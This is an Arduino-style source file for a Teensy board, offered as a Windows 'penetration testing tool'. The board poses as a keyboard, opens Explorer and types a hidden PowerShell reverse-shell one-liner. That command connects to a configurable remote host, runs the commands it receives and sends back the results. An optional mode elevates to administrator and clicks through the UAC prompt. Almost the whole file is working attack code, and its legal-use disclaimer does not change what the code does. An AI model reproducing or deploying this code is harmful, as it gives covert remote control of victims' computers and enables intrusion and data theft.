// ,- Author & Credits -> : TDiff; Thanks to Offensive Security (Peensy)
// `--------------------> : for the ideas, samratashok (tiny TCP Client)

// -- Purpose ----------> : Penetration Testing Tool for Windows 7 => 10
// -- Tested Platforms -> : Windows 7 x86, Windows 8 x64, Windows 10 x64

// ,- Hardware ---------> : Required : - A Teensy board  (2.0 up to 3.6)
// `--------------------> : Optional : - 3 Buttons to set options easily
// `--------------------> :            - 1 button to reset w/o rebooting

// ,- Disclaimer -------> : ############################################
// `--------------------> : ##      INTENDED FOR LEGAL USE ONLY       ##
// `--------------------> : ############################################
// `--------------------> : I'm not liable for any missuses of this code

#include <EEPROM.h>
#define KEY_COUNTRY KEY_Q // Change that to KEY_A if you're using a QWERTY keyboard
#define CPU_RESTART (*(uint32_t *)0xE000ED0C = 0x5FA0004)
#define SEND_KEY Keyboard.send_now();delay(50)

 /////////////
// Config  ///////////////////////
String sAddr  = "0.0.0.0";      // TCP Server Address
String sPort  = "1337";         // TCP Server Port
bool   bAdmin = false;          // Admin Mode
//////////////////////////////////

// Pin numbers
unsigned int iLedPin     = 13;
unsigned int iButtonPin3 = 12;
unsigned int iButtonPin2 = 11;
unsigned int iButtonPin1 = 10;
unsigned int iResetPin   = 0;

// LED feedback function
void ledBlink (int iReps, int iDelay) {
  for(int i = 0; i<iReps; i++) { 
    digitalWrite(iLedPin, HIGH); delay(iDelay); 
    digitalWrite(iLedPin, LOW); delay(iDelay);
  }
}

// Press key(s) and unpress it/them
void pressKey(unsigned int iKey, unsigned int iModifiers = 0) {
  Keyboard.set_modifier(iModifiers);
  Keyboard.set_key1(iKey);
  SEND_KEY;
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  SEND_KEY;
}

// NUM, SCROLL, CAPS Led keys checking. 
bool isScrlOn (void) { return ((int(keyboard_leds)& 4) == 4) ? true : false; }
bool isCapsOn (void) { return ((int(keyboard_leds)& 2) == 2) ? true : false; }
bool isNumsOn (void) { return ((int(keyboard_leds)& 1) == 1) ? true : false; }

// Wait for Windows to be ready before we start typing.
void waitForDrivers (int iDelay = 0, bool bInitialState = isScrlOn()) {

  while(bInitialState == isScrlOn()) { pressKey(KEY_SCROLL_LOCK); iDelay += 100; }

  // If it's been taking too long, reboot the tinsy to prevent
  // garbage to be sent, as the driver might not be fully ready
  if ((iDelay >= 10000) && (int(EEPROM.read(0)) != 255)) { 
    EEPROM.write(0,255); CPU_RESTART;  
  }
  
  if (int(EEPROM.read(0)) != 0) { EEPROM.write(0,0); }
  if (isScrlOn()) { pressKey(KEY_SCROLL_LOCK); }
  if (isCapsOn()) { pressKey(KEY_CAPS_LOCK); }
}

void setup () {
  // Init led state
  pinMode(iLedPin, OUTPUT);   // LED Feedback pin
  digitalWrite(iLedPin, LOW); // Make sure the LED is off after reset

  // Init pin modes
  pinMode(iButtonPin1, INPUT_PULLUP); // Launch button
  pinMode(iButtonPin2, INPUT_PULLUP); // Admin mode button
  pinMode(iButtonPin3, INPUT_PULLUP); // Confirmation button
  pinMode(iResetPin  , INPUT_PULLUP); // Back to the setup button
  
  // Is windows ready?
  waitForDrivers(); 

  // Wait for the launch button to be pressed
  while (!digitalRead(iButtonPin1)) { ledBlink(1,50); }

  // Admin mode
  if (digitalRead(iButtonPin2)) { bAdmin = true; }

  // Prepare the PowerhShell TCP Client
  String sPowerShellCmd = "powershell -w 1 "; 
  if (bAdmin) { sPowerShellCmd += "saps powershell -A '-W 1',{"; }  
  sPowerShellCmd += "sal n New-Object;for($w=n byte[] 64kb){for($u=(n Net.Sockets.TCPClient('" + sAddr + "'," + sPort + ")).GetStream();";
  sPowerShellCmd += "($i=$u.Read($w,0,64kb))-ne0){$v=($b=[text.encoding]::UTF8).GetBytes((iex $b.GetString($w,0,$i)|out-string));$u.Write($v,0,$v.Length)}}";
  if (bAdmin) { sPowerShellCmd += "} -Verb runAs"; }

  // Open Explorer (Win+E)
  pressKey(KEY_E, MODIFIERKEY_LEFT_GUI);

  // Wait for confirmation from the agent
  while (!digitalRead(iButtonPin3)) { ledBlink(1,50); }

  // Prepare to type in the path bar (Ctrl+F4 & Ctrl+A)
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_CTRL);
  Keyboard.set_key1(KEY_F4);
  Keyboard.set_key2(KEY_COUNTRY);
  SEND_KEY;
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.set_key2(0);
  SEND_KEY;
  
  // Launch the TCP Client
  Keyboard.println(sPowerShellCmd);
  delay(500);

  // If admin mode
  if (bAdmin) {
    // Wait for confirmation from the agent
    while (!digitalRead(iButtonPin3)) { ledBlink(1,50); }
  
    // Accept UAC prompt
    pressKey(KEY_LEFT);
    pressKey(KEY_ENTER); 
  }

  // Tell the agent everything is done
  digitalWrite(iLedPin, HIGH);
}

void loop () {
  // If the reset pin is triggered restart the setup
  if (digitalRead(iResetPin)) { setup(); }
  
  delay(50); // Don't waste too much CPU cycles
}
